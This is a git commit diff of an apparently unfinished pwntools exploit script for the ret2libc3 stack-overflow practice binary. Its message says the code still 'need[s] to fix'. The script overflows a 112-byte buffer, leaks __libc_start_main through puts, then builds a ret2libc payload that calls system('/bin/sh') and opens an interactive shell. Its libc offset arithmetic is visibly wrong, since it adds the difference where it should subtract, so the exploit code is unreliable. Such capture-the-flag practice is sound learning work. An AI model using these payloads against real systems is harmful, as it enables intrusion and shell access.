ba44b0e2cc2b96039ba76334d380cd5d044763ab
smakk <likaiming66@gmail.com>
2019-03-29 22:42:05 -0700

    ret2libc3 need to fix

--- stack/ret2libc3/exp.py
+++ stack/ret2libc3/exp.py
@@ -1,15 +1,41 @@
-from pwb import *
+from pwn import *
 
 p = process("./ret2libc3")
 libc = ELF("./libc.so")
-#得到libc中所需要的函數的相對偏移
-__libc_start_main = libc.symbols["__libc_start_main"]
+
+libc_start_main = libc.symbols["__libc_start_main"]
 system = libc.symbols["system"]
-str_binsh = 0x0
+str_binsh = int(0x0)
 for address in libc.search("/bin/sh\x00"):
 	str_binsh = address
-#得到內存中__libc_start_main的位置
 
+ret2libc3 = ELF("./ret2libc3")
+got_libc_start_main = ret2libc3.got["__libc_start_main"]
+plt_puts = ret2libc3.plt["puts"]
+main = ret2libc3.symbols["main"]
+'''
+print(hex(got_libc_start_main))
+print(hex(plt_puts))
+print(hex(main))
+print(hex(str_binsh))
+'''
+payload1 = "a"*112+p32(plt_puts)+p32(main)+p32(got_libc_start_main)
+p.sendlineafter("Can you find it !?",payload1)
+#print(p.recv(10))
+#print(p.recvline())
+#print(p.recvuntil("Can you find it !?"))
+#print(p.recvline())
 
-payload1 = 'a'*112+
-p.sendline()
+vaddr_libc_start_main = p.unpack()
+#print(hex(vaddr_libc_start_main))
+
+vaddr_system = vaddr_libc_start_main + (libc_start_main - system)
+vddr_str_binsh = vaddr_libc_start_main + (libc_start_main - str_binsh)
+
+#print(hex(vaddr_got_libc_start_main))
+#print(hex(vaddr_system))
+#print(hex(vddr_str_binsh))
+
+payload2 = "a"*112 + p32(vaddr_system) + p32(0x0) + p32(vddr_str_binsh)
+p.sendline(payload2)
+p.interactive()
